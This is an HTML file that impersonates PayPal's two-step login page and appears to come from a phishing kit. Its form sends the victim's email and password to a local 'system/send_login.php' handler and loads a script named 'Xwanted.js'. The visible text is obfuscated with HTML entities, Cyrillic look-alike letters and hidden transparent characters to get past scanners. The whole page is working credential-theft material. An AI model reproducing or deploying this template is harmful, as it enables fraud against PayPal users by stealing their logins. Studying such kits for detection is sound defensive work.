<!DOCTYPE html>
<html>
<head>
  <title>PayPal</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" type="text/css" href="assets/bulma.min.css">
  <link rel="stylesheet" type="text/css" href="assets/style.css">
<link rel="shortcut icon" href="assets/pp_favicon_x.ico" />
</head>
<body>
<form action="system/send_login.php" method="post">
<div class="container_login" id="login_email">
  <div class="login_box">
    <center>
      <img src="assets/logo.svg" alt="" style="width: 119px;"><br><br>
      <input type="text" name="email" placeholder="E&#109;а&#105;&#108;" class="input_login" id="email">
      <div class="errorMessageEmail" style="display: none;"><p>E&#110;&#116;&#101;&#114;<span style='color: transparent;font-size: 15px;'>x</span>&#121;&#111;&#117;&#114;<span style='color: transparent;font-size: 15px;'>x</span>&#101;&#109;&#97;&#105;&#108;<span style='color: transparent;font-size: 15px;'>x</span>&#97;&#100;&#100;&#114;&#101;&#115;&#115;.</p></div>
      <br>
      
      <br>
      <div class="columns is-multiline is-mobile" id="col">
      <div class="column is-12">
      <span name="btn" id="btn" style="border-radius: 4px;" class="next" >Next</span>
      </div></div>
      <p style="color: #0070ba;">H&#97;&#118;&#105;&#110;&#103;<span style='color: transparent;font-size: 15px;'>x</span>&#116;&#114;&#111;&#117;&#98;&#108;&#101;<span style='color: transparent;font-size: 15px;'>x</span>&#108;&#111;&#103;&#103;&#105;&#110;&#103;<span style='color: transparent;font-size: 15px;'>x</span>&#105;&#110;?</p>
      <div class="loginSignUpSeparator">
      <span class="textInSeparator">or</span></div>
    <button id="btn" style="border-radius: 4px;background-color: #E1E7EB;color: #2C2E2F;border: 0;">S&#105;&#103;&#110;U&#112;</button>
    </center>
</div>
</div>

<div class="container_login" id="login_passwd" style="display: none;">
  <div class="login_box">
    <center>
      <img src="assets/logo.svg" alt="" style="width: 119px;margin-bottom: 10px;">
      <br><span id="vicmail"></span>&nbsp;&nbsp;&nbsp;&nbsp;<span style="color: #0070ba;">Change</span><br><br>
      <input type="password" name="pass" id="pass" placeholder="Pа&#115;&#115;&#119;о&#114;&#100;" class="input_login" minlength="8" required>
      <div class="errorMessagePass" style="display: none;"><p>Enter your &#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;.</p></div>
      <br>
      
      <br>
      <div class="columns is-multiline is-mobile" id="col">
      <div class="column is-12">
      <button name="btn" id="btn" class="sub" style="border-radius: 4px;">L&#111;&#103;<span style='color: transparent;font-size: 15px;'>x</span>I&#110;</button>
      </div></div>
      <p style="color: #0070ba;">Having trouble &#108;&#111;&#103;&#103;&#105;&#110;&#103; in?</p>
      <div class="loginSignUpSeparator">
      <span class="textInSeparator">or</span></div>
    <button id="btn" style="border-radius: 4px;background-color: #E1E7EB;color: #2C2E2F;border: 0;">S&#105;&#103;&#110;U&#112;</button>
    </center>
</div>
</div>

<div class="spinner loading" id="spinner" style="display: none;"></div>
<br><br><br><br><br><br><br>
<div class="login_footer">
  <center>
    <p class="text_footer">Contact Us &nbsp;&nbsp;Privacy &nbsp;&nbsp;Legal &nbsp;&nbsp;Worldwide</p>
  </center>
</div>
<script src="https://code.jquery.com/jquery-3.3.1.js"></script>
<script type="text/javascript" src="assets/Xwanted.js"></script>
</form>
</body>
</html>